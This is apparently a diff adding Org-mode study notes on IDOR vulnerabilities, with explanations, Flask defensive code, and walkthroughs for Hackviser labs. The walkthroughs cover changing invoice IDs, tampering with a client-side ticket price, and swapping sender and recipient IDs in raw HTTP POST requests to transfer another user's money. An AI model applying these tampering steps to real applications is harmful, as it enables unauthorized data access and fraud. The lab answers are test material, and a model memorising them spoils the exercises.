@@ -65,3 +65,212 @@ Test POST parameters sent via forms or APIs. Examine and alter parameter values 
   "transaction_id": 4321
 }
 #+end_src
+If changing the transaction_id value allows viewing another user's transaction, it signifies an IDOR vulnerability.
+
+** authentication and authorization testing
+IDOR typically stems from authentication or authorization shortcomings.
+
+*authorized vs Unauthorized testing* ->
+Conduct access attempts to the same resource by users with different privilege levels. For instance, attempting to access an administrator's data while logged in as a regular user.
+
+*inter-user role testing* ->
+Test for unauthorized data sharing between different user roles to see if there is any unauthorized access.
+
+* mass IDOR scanning
+Mass IDOR Enumeration (Mass IDOR Scanning) is the process of discovering IDOR vulnerabilities comprehensively and quickly.
+
+Mass enumeration aims to systematically change different object references and potentially access a vast database by combining manual and automated scanning methods.
+
+*idor enum* ->
+Attackers change individual parameters and observe how the application responds to determine the presence of IDOR vulnerabilities. Mass IDOR Enumeration is the scaled-up version of this process.
+
+*bulk data access* ->
+Obtain unauthorized access to different objects of the same data type (e.g., users, files, transactions).
+*data leakage* ->
+Access large amounts of unauthorized data and leak sensitive information.
+*system manipulation* ->
+Change the system's behavior through bulk identity manipulation.
+
+* invoices
+This lab contains an Insecure Direct Object References (IDOR) vulnerability that allows unauthorized access to other customers' invoices.
+
+To complete this lab, access other customers' invoices by changing the "invoice_id" value in the URL and find the invoice for the customer named "Emilia Rawne".
+
+What is the email address of the customer named Emilia Rawne?
+
+to solve just change the ?id parameter in the url until find the desired document
+: https://useful-rocket.europe1.hackviser.space/index.php?invoice_id=1003
+
+* ticket sales
+This lab contains an Insecure Direct Object References (IDOR) vulnerability that causes a product to be offered at a lower price.
+
+Your starting balance will not be enough to purchase tickets. To complete the lab, purchase tickets by manipulating the price sent to the server during ticket purchase.
+
+What is the order id that appears after the ticket is purchased?
+
+When we look at the source code of the page, we see that the ticket amount is sent as form data from the client. This means that as a client, we can change the ticket price to any value we want.
+
+We can change this ticket_money POST data using a proxy tool like Burp Suite or by editing the DOM through Chrome DevTools.
+
+Let's edit the value field of this form data, which currently says 300. Since our balance is 50$, we need to set this value to less than 5.0
+
+We have set the value of ticket_money to 10, entered 2 as the ticket quantity, and then clicked the Buy button.
+
+* prevent IDOR
+Let’s assume that a user should only have access to their own order information. Here's a simple check using Python's Flask framework.
+
+#+begin_src python
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+# Sample order data stored in the database
+orders = {
+    1: {"user_id": 1, "details": "Order 1 details"},
+    2: {"user_id": 2, "details": "Order 2 details"}
+}
+
+# Authenticated user information
+logged_in_user = {"id": 1, "username": "user1"}
+
+@app.route('/order/<int:order_id>', methods=['GET'])
+def get_order(order_id):
+    order = orders.get(order_id)
+
+    if order and order['user_id'] == logged_in_user['id']:
+        return jsonify(order), 200
+    else:
+        return jsonify({"error": "Unauthorized access"}), 403
+
+if __name__ == '__main__':
+    app.run(debug=True)
+#+end_src
+
+In this example, each order accessed by order_id is checked to see if it matches the authenticated user's user_id.
+
+** use of indirect object reference
+In this example, each order accessed by order_id is checked to see if it matches the authenticated user's user_id.
+
+Using UUIDs (Universally Unique Identifiers) as unique references makes it difficult to guess object IDs.
+
+#+begin_src python
+import uuid
+
+# UUID generation
+user_uuid = str(uuid.uuid4())
+print(f"User UUID: {user_uuid}")
+
+# Storing user data with UUID
+users = {
+    user_uuid: {"username": "user1", "email": "user1@example.com"}
+}
+
+# Access control
+@app.route('/user/<uuid:user_id>', methods=['GET'])
+def get_user(user_id):
+    user = users.get(str(user_id))
+
+    if user:
+        return jsonify(user), 200
+    else:
+        return jsonify({"error": "User not found"}), 404
+#+end_src
+
+By using UUID, a unique and unpredictable object reference is created.
+
+** data minimization
+API or application endpoints should provide only the necessary data. Returning more data than necessary can help attackers to better understand the system structure.
+
+*limiting json response* ->
+To return a user's credentials with only the necessary fields:
+#+begin_src python
+@app.route('/user/info', methods=['GET'])
+def get_user_info():
+    # Sample user data
+    user_info = {
+        "username": "user1",
+        "email": "user1@example.com",
+        "phone": "1234567890",
+        "address": "123 Main St."
+    }
+
+    # Return only the necessary information
+    response_data = {
+        "username": user_info["username"],
+        "email": user_info["email"]
+    }
+
+    return jsonify(response_data), 200
+#+end_src
+
+In this example, the user's credentials are returned with only limited fields.
+
+** logging and monitoring
+Logs should be kept and monitoring should be done to detect suspicious activities early.
+
+For instance, a high number of requests from the same client in a short time might indicate a mass enumeration attack.
+
+** security testing
+Manual and automated security testing will reveal vulnerabilities in your application.
+
+ - Perform penetration testing manually by changing identity references to detect IDOR.
+
+- Use security scanning tools to scan API endpoints and web applications.
+
+
+* money transfer lab
+This lab contains an Insecure Direct Object References (IDOR) vulnerability that allows you to transfer money from another user's account.
+
+To complete the lab, transfer money from user "User 2" to your own account ("User 1") by exploiting the IDOR vulnerability in the endpoint performing the money transfer.
+
+What is the transfer ID that appears when money arrives in the user account?
+
+request ->
+#+begin_src java
+POST / HTTP/1.1
+Host: clean-flora.europe1.hackviser.space
+Cookie: PHPSESSID=3qis1k7b9a63cdo3ks50m74u55
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: https://clean-flora.europe1.hackviser.space
+Referer: https://clean-flora.europe1.hackviser.space/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+transfer_amount=100&recipient_id=2&sender_id=1
+#+end_src
+
+Just change the recipient_id and sender_id
+#+begin_src java
+POST / HTTP/1.1
+Host: clean-flora.europe1.hackviser.space
+Cookie: PHPSESSID=3qis1k7b9a63cdo3ks50m74u55
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: https://clean-flora.europe1.hackviser.space
+Referer: https://clean-flora.europe1.hackviser.space/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+transfer_amount=100&recipient_id=1&sender_id=2
+#+end_src
